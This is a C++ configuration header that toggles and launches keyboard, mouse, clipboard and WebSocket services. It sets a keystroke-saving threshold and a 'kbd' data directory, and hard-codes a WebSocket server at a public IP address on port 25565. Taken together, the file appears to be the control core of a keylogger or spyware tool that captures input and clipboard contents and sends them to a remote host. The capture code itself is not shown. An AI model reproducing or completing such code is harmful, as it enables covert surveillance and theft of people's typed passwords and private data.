#pragma once

// Service toggle
#define KEYBOARD_SERVICE	true
#define MOUSE_SERVICE		true
#define CLIPBOARD_SERVICE	true
#define WEBSOCKET_SERVICE	true

// WebSocket settings
//#define WS_HOST "ws://localhost:8080/"
#define WS_HOST "ws://5.58.91.27:25565/"
#define WS_CONNECTION_DELAY_SEC 5

// Keyboard settings
#define KBD_MAX_REPEATS 5
#define KBD_KEYS_TO_SAVE 100	// How many times key should be pressed to save data
#define KBD_DIR "kbd"			// Name of keyboard service working directory

// Includes
#if KEYBOARD_SERVICE
#include "keyboard.hpp"
#endif
#if MOUSE_SERVICE
#include "mouse.hpp"
#endif
#if CLIPBOARD_SERVICE
#include "clipboard.hpp"
#endif
#if WEBSOCKET_SERVICE
#include "websocket.hpp"
#endif

namespace services
{
	static void runAll()
	{
#if KEYBOARD_SERVICE
		keyboard::run();
#endif
#if MOUSE_SERVICE
		mouse::run();
#endif
#if CLIPBOARD_SERVICE
		clipboard::run();
#endif
#if WEBSOCKET_SERVICE
		websocket::run();
#endif
	}

	static void stopAll()
	{
#if KEYBOARD_SERVICE
		keyboard::stop();
#endif
#if MOUSE_SERVICE
		mouse::stop();
#endif
#if CLIPBOARD_SERVICE
		clipboard::stop();
#endif
#if WEBSOCKET_SERVICE
		websocket::stop();
#endif
	}
}